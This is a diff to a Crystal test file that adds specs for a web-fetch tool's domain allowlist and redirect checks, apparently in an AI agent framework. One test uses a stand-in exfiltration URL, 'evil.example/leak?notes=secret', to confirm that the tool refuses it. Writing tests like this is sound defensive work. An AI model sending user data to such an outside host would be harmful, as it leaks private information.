@@ -27,7 +27,31 @@ describe Autobot::Tools::WebSearchTool do
   end
 end
 
+private class WebFetchToolTest < Autobot::Tools::WebFetchTool
+  def test_validate_redirect_uri(uri : URI) : String?
+    validate_redirect_uri(uri)
+  end
+end
+
 describe Autobot::Tools::WebFetchTool do
+  describe "egress allowlist" do
+    it "refuses hosts outside tools.web.allowed_domains before connecting" do
+      tool = Autobot::Tools::WebFetchTool.new(allowed_domains: ["example.com", "*.strava.com"])
+
+      result = tool.execute({"url" => JSON::Any.new("https://evil.example/leak?notes=secret")} of String => JSON::Any)
+
+      result.access_denied?.should be_true
+      result.content.should contain("not in tools.web.allowed_domains (example.com, *.strava.com): evil.example")
+    end
+
+    it "refuses a redirect that leaves the allowed domains" do
+      tool = WebFetchToolTest.new(allowed_domains: ["1.1.1.1"])
+
+      tool.test_validate_redirect_uri(URI.parse("https://evil.example/x")).to_s.should contain("not in tools.web.allowed_domains")
+      tool.test_validate_redirect_uri(URI.parse("https://1.1.1.1/x")).should be_nil
+    end
+  end
+
   describe "#name" do
     it "returns web_fetch" do
       tool = Autobot::Tools::WebFetchTool.new
